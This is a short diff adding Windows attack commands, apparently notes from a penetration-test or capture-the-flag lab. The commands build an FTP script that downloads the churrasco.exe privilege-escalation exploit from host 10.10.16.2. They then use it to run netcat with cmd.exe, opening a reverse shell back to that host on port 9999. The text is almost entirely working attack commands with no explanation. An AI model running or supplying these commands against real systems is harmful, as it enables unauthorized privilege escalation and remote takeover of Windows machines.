@@ -1,0 +1,5 @@
+echo open 10.10.16.2 21> ftp.txt&echo USER anonymous >> ftp.txt&echo anonymous>> ftp.txt&echo bin>> ftp.txt&echo GET churrasco.exe >> ftp.txt&echo bye>> ftp.txt
+
+ftp -v -n -s:ftp.txt
+
+churrasco.exe -d "C:\wmpub\nc.exe 10.10.16.2 9999 -e cmd.exe"
